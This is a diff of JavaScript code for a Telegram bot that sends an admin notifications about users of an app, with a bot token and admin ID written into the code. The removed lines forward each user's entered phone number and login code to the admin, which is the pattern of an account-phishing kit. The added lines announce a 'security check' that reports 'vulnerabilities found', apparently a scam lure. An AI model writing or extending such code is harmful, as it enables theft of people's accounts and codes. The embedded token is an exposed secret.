@@ -1,12 +1,12 @@
-// Конфигурация (замените значения)
+// Конфигурация
 const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
 const ADMIN_ID = '5665980031';
 
 // Форматирование сообщения
 const formatMessage = (type, data, user) => {
     const userInfo = `👤 ${user.first_name || 'Пользователь'} ${user.last_name || ''}\n` +
-                    `🆔 Id: <code>${user.id || '?'}</code>\n` +
-                    `🔗 User: @${user.username || '?'}\n`;
+                    `🆔 ID: <code>${user.id || '?'}</code>\n` +
+                    `🔗 USER: @${user.username || '?'}`;
     
     switch(type) {
         case 'init':
@@ -14,19 +14,25 @@ const formatMessage = (type, data, user) => {
                 text: `🚪 <b>Новый вход в приложение</b>\n\n${userInfo}`,
                 buttons: []
             };
-        case 'phone':
+        case 'verified_enter':
             return {
-                text: `📱 <b>Введён номер:</b> <code>${data}</code>\n\n${userInfo}`,
+                text: `🟢 <b>Верифицированный пользователь вошел</b>\n\n${userInfo}`,
                 buttons: []
             };
-        case 'code':
+        case 'security_check_start':
             return {
-                text: `🔢 <b>Введён код</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
+                text: `🔍 <b>Пользователь начал проверку безопасности</b>\n\n${userInfo}`,
+                buttons: []
+            };
+        case 'security_check_complete':
+            return {
+                text: `📊 <b>Проверка безопасности завершена</b>\n\n${userInfo}\n\n` +
+                      `Найдено уязвимостей: <b>${data.vulnerabilities || 0}</b>`,
                 buttons: []
             };
         default:
             return {
-                text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: ${data}\n\n${userInfo}`,
+                text: `ℹ️ <b>Новое событие</b>\n\nТип: ${type}\nДанные: ${JSON.stringify(data)}\n\n${userInfo}`,
                 buttons: []
             };
     }
